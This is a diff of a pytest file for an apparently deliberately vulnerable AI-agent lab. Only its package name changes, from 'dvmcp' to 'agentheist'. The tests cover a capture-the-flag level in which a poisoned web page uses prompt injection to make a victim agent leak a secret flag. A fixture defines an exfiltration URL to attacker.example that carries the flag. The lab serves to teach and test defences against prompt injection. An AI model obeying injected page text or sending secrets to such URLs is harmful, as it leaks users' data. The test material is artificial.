@@ -4,13 +4,13 @@ from urllib.parse import quote
 import pytest
 from mcp import Client
 
-from dvmcp import cli
-from dvmcp.agent import Agent
-from dvmcp.flags import check_flag, find_flags
-from dvmcp.levels import get_level
-from dvmcp.levels import level02_secure_research as secure
-from dvmcp.levels.level02_poisoned_page import FLAG, VICTIM_REQUEST, server
-from dvmcp.web import AttackerSite, fetch
+from agentheist import cli
+from agentheist.agent import Agent
+from agentheist.flags import check_flag, find_flags
+from agentheist.levels import get_level
+from agentheist.levels import level02_secure_research as secure
+from agentheist.levels.level02_poisoned_page import FLAG, VICTIM_REQUEST, server
+from agentheist.web import AttackerSite, fetch
 
 INJECTED_PAGE = """\
 <h1>ZephyrHost Enterprise - $16,900/month</h1>
@@ -22,7 +22,7 @@ EXFIL_URL = f"http://attacker.example/verify?key={FLAG.replace('{', '%7B').repla
 
 @pytest.fixture(autouse=True)
 def lab_home(tmp_path, monkeypatch):
-    monkeypatch.setenv("DVMCP_HOME", str(tmp_path))
+    monkeypatch.setenv("AGENTHEIST_HOME", str(tmp_path))
     monkeypatch.setattr(secure, "session", secure.Session())
     return tmp_path
 
@@ -98,13 +98,13 @@ def test_level_metadata():
     assert level.mode == "victim"
     assert get_level(1).mode == "chat"
     briefing = level.briefing.format(site_root="/r", site_log="/l")
-    assert "/r" in briefing and "/l" in briefing and "DVMCP{...}" in briefing
+    assert "/r" in briefing and "/l" in briefing and "HEIST{...}" in briefing
     assert "{url}" in VICTIM_REQUEST
 
 
 def test_flag_checking():
     assert check_flag(2, FLAG)
-    assert not check_flag(2, "DVMCP{nope}")
+    assert not check_flag(2, "HEIST{nope}")
     assert not check_flag(1, FLAG)
 
 
@@ -206,7 +206,7 @@ def test_victim_tool_view_hides_arguments_and_outputs(capsys):
     assert FLAG not in shown and "%7B" not in shown and "Treasury" not in shown
 
 
-def test_victim_server_gets_dvmcp_home(lab_home):
+def test_victim_server_gets_agentheist_home(lab_home):
     params = cli.level_server(get_level(2))
-    assert params.env["DVMCP_HOME"] == str(lab_home)
-    assert params.args == ["-m", "dvmcp.levels.level02_poisoned_page"]
+    assert params.env["AGENTHEIST_HOME"] == str(lab_home)
+    assert params.args == ["-m", "agentheist.levels.level02_poisoned_page"]
